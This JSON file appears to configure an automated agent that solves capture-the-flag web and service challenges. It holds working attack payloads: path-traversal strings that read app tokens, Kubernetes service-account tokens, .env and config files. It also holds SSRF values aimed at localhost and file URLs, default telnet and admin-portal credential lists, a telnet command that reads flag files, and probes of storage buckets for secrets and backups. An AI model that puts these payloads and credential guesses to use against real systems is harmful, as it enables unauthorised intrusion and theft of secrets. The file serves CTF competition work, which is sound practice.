{
  "selection_policy": {
    "difficulty_order": ["easy", "medium", "hard"],
    "fast_path_difficulties": ["easy"],
    "handoff_difficulties": ["medium", "hard"],
    "recovery_difficulties": ["easy"],
    "unreachable_retries": 3,
    "estimated_fast_score": 150
  },
  "execution_control_policy": {
    "max_probe_paths": 180,
    "max_probe_urls": 80,
    "max_authenticated_urls": 120,
    "max_payloads_per_param": 40,
    "max_flag_paths": 40,
    "fast_probe_seconds": 45,
    "max_subagents": 0,
    "subtask_concurrency": ""
  },
  "disabled_builtin_fingerprints": [],
  "disabled_builtin_sections": [],
  "probe_paths": [
    "healthz",
    "status",
    ".well-known/security.txt",
    "api/version"
  ],
  "flag_paths": [
    "/opt/app/flag.txt",
    "/run/secrets/flag",
    "/workspace/flag"
  ],
  "text_path_prefixes": [
    "debug",
    "internal",
    "download",
    "assets"
  ],
  "response_path_keys": [
    "artifact_endpoint",
    "export_path",
    "debug_url"
  ],
  "param_payload_profiles": [
    {
      "name_contains": ["token", "secret", "key"],
      "payloads": [
        "../../../../../run/secrets/app_token",
        "../../../../../var/run/secrets/kubernetes.io/serviceaccount/token",
        "file:///run/secrets/app_token"
      ]
    },
    {
      "name_suffix": ["_url", "_uri"],
      "payloads": [
        "http://127.0.0.1/flag",
        "http://localhost/admin",
        "file:///flag"
      ]
    }
  ],
  "lfi_base_paths": [
    "../../../../app/config.py",
    "../../../../app/.env",
    "../../../../opt/service/config.yaml"
  ],
  "lfi_param_keys": [
    "file",
    "path",
    "doc"
  ],
  "lfi_trigger_markers": [
    "missing file",
    "missing document",
    "file id"
  ],
  "lfi_default_endpoint": "download.php",
  "object_storage_buckets": [
    "public-artifacts",
    "private-artifacts",
    "app-backups"
  ],
  "object_storage_keys": [
    "flag.txt",
    "secrets.json",
    "backup/config.yaml",
    ".env"
  ],
  "raw_protocol_commands": [
    "INFO",
    "STATUS",
    "DUMP",
    "GET FLAG"
  ],
  "telnet_credentials": [
    {"username": "operator", "password": "operator"},
    {"username": "service", "password": "service123"}
  ],
  "telnet_flag_command": "cat /flag /flag.txt /challenge/flag.txt /run/secrets/flag 2>/dev/null",
  "webapp_flow_profiles": [
    {
      "name": "generic-admin-portal",
      "indicators": [
        "admin portal",
        "demo account",
        "name=\"password\"",
        "data-login-form"
      ],
      "credentials": [
        {"username": "admin", "password": "admin"},
        {"username": "demo", "password": "demo123"}
      ],
      "authenticated_paths": [
        "",
        "admin",
        "dashboard",
        "api/me"
      ],
      "handoff_paths": [
        "api/config",
        "api/secret",
        "api/export",
        "download?file=../../../../flag"
      ]
    }
  ],
  "service_probe_profiles": [
    {
      "fingerprint": "langflow",
      "probe_paths": [
        "api/v1/health",
        "api/v1/flows"
      ]
    },
    {
      "fingerprint": "customsvc",
      "match_any": [
        "customsvc",
        "x-customsvc-version",
        "custom service gateway"
      ],
      "match_any_all": [
        ["rpc-methods", "export"],
        ["service", "workspace", "token"]
      ],
      "unresolved": "reasoning",
      "reason": "CustomSvc fingerprint matched; continue only from observed RPC/API evidence.",
      "probe_paths": [
        "api/status",
        "api/config",
        "rpc/methods",
        "debug/export"
      ],
      "probe_requests": [
        {
          "label": "rpc export preview",
          "method": "POST",
          "path": "rpc/export",
          "headers": {
            "X-Requested-With": "CyberAgent"
          },
          "json": {
            "method": "export",
            "limit": 1
          }
        },
        {
          "method": "POST",
          "path": "debug/login",
          "data": {
            "username": "demo",
            "password": "demo"
          }
        }
      ],
      "tcp_ports": [
        {
          "port": 5005,
          "label": "debug protocol"
        },
        8562
      ],
      "handoff_context": "## CustomSvc generic handoff\nUse only observed response headers, exposed RPC methods, OpenAPI/RPC metadata, cookies, redirects, and error messages. Do not assume a fixed challenge ID or fixed exploit path.",
      "evidence_focus": [
        "service headers",
        "exposed RPC/OpenAPI metadata",
        "auth cookies and redirects",
        "debug config or token leakage"
      ],
      "avoid_focus": [
        "fixed challenge IDs",
        "fixed exploit paths",
        "broad brute force without response differences"
      ]
    }
  ],
  "service_handoff_profiles": [
    {
      "fingerprint": "artifactstore",
      "context": "## ArtifactStore generic handoff\nThe service behaves like an artifact/object index. Prefer listed keys, bucket names, signed URL mistakes, directory listings, and metadata endpoints observed in responses.",
      "evidence_focus": [
        "object listings",
        "metadata endpoints",
        "bucket names",
        "signed URL parameters"
      ],
      "avoid_focus": [
        "broad brute force",
        "unobserved bucket names",
        "fixed exploit paths"
      ]
    }
  ],
  "service_action_profiles": [
    {
      "fingerprint": "customsvc",
      "label": "CustomSvc",
      "actions": {
        "handoff": {
          "reasoning_reason": "CustomSvc bounded probe found service evidence; hand off for one evidence-driven exploit hypothesis.",
          "summary": "{code} has CustomSvc evidence but no direct flag; keep active for focused reasoning."
        },
        "exploit": {
          "abandon_reason": "CustomSvc bounded exploit did not find a submit-ready flag.",
          "summary": "{code} CustomSvc follow-up found no flag or submit-ready candidate; mark abandoned for close/switch."
        },
        "close": true
      }
    }
  ]
}
